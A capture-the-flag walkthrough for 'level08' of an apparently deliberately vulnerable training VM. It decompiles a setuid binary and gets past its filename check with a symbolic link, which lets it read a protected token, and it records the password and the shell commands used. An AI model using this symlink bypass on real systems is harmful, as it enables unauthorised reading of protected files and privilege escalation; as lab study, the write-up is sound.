# level08

## Steps

1. __Action__ (Guest): list the files present in the `level08` user's home directory
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals 2 files possibly of interest,
	named `level08` and `token`
	```
	.bash_logout  .bashrc  .profile  level08  token
	```

3. __Action__ (Guest): check the file access control list of both `level08` and `token` files
	```sh
	getfacl level08 token
	```

4. __Observation__ (Guest): the previous command reveals that:
	- the `level08` file:
		- is readable by the `level08` group
		- is executable by the `level08` group
		- is owned by the `flag08` user
		- has the `setuid` bit enabled

	- the `token` file:
		- is readable only by the `flag08` user

	```
	# file: level08
	# owner: flag08
	# group: level08
	# flags: ss-
	user::rwx
	group::---
	group:level08:r-x
	group:flag08:r-x
	mask::r-x
	other::---

	# file: token
	# owner: flag08
	# group: flag08
	user::rw-
	group::---
	other::---
	```

5. __Action__ (Host): copy the `level08` file from the virtual machine
	```sh
	sshpass -f level07/flag 2>/dev/null \
		scp -P 4242 level08@192.168.122.214:level08 level08
	```

5. __Action__ (Host): decompile the `level08` file using [dogbolt](https://dogbolt.org/)

6. __Observation__ (Host): the Ghidra decompiler reveals that the `level08` takes a filename
	as an argument, and it reads the content of the file and writes it to the standard output.
	The thing is that it checks if the filename contains the string `token`, and if it does,
	it prints an error message and exits. So we could not just pass the `token` file as an
	argument to the `level08` file, but we could create a symbolic link to the `token` file,
	making sure that the name of the symbolic link does not contain the string `token`, and
	then pass the name of the symbolic link as an argument to the `level08` file.
	```c
	#include <stdlib.h>

	int main(int const ac, char const *const *const av) {
		if (ac == 1) {
			printf("%s [file to read]\n", av[0]);
			exit(EXIT_FAILURE);
		}
		if (strstr(av[1], "token") != NULL) {
			printf("You may not access \'%s\'\n", av[1]);
			exit(EXIT_FAILURE);
		}

		int const fd = open(av[1], 0);
		if (fd == -1) {
			err(1, "Unable to open %s", av[1]);
		}

		char          buffer[1024];
		ssize_t const number_of_bytes_read = read(fd, buffer, sizeof(buffer)); close(fd);
		if (number_of_bytes_read == -1) {
			err(1, "Unable to read fd %d", fd);
		}

		return write(STDOUT_FILENO, buffer, number_of_bytes_read);
	}
	```

7. __Action__ (Host): reminding that the `level05` had a special directory
	named `openarenaserver` in the `/opt` directory,  
	in which the `level05` user had all the permissions (read, write, and execute),  
	create the symbolic link named `.bypass` in this directory as the `level05` user
	```sh
	sshpass -f level04/flag 2>/dev/null \
		ssh -p 4242 level05@192.168.122.214 \
			ln -s /home/user/level08/token /opt/openarenaserver/.bypass
	```

8. __Action__ (Guest): check that the `.bypass` symbolic link has been correctly created
	and points to the `token` file
	```sh
	[ -L /opt/openarenaserver/.bypass ] \
	|| ( echo 'Symbolic link does not exist' >&2; exit 1 ); \
	[ $(readlink /opt/openarenaserver/.bypass) = '/home/user/level08/token' ] \
	|| ( echo 'Symbolic link does not point to the right file' >&2; exit 1 ); \
	echo 'Symbolic link exists and points to the right file'
	```

9. __Observation__ (Guest): the following message appears on stdout:  
	`Symbolic link exists and points to the right file`  
	confirming that the `.bypass` symbolic link has been correctly created
	and points to the `token` file

10. __Action__ (Guest): execute the `level08` file with the `.bypass` symbolic link
	as the first argument
	```sh
	./level08 /opt/openarenaserver/.bypass
	```

11. __Observation__ (Guest): as expected, the check on the filename is bypassed,  
	and the content of the `token` file appears on stdout: `quif5eloekouj29ke0vouxean`

12. __Action__ (Host): remove the `.bypass` symbolic link
	```sh
	sshpass -f level04/flag 2>/dev/null \
		ssh -p 4242 level05@192.168.122.214 \
			rm /opt/openarenaserver/.bypass
	```

13. __Action__ (Host): run the `getflag` command as the `flag08` user
	and save the token in the `flag` file
	```sh
	sshpass -p quif5eloekouj29ke0vouxean 2>/dev/null \
		ssh -p 4242 flag08@192.168.122.214 \
			getflag \
	| egrep -o '[^ ]+$' >level08/flag
	```
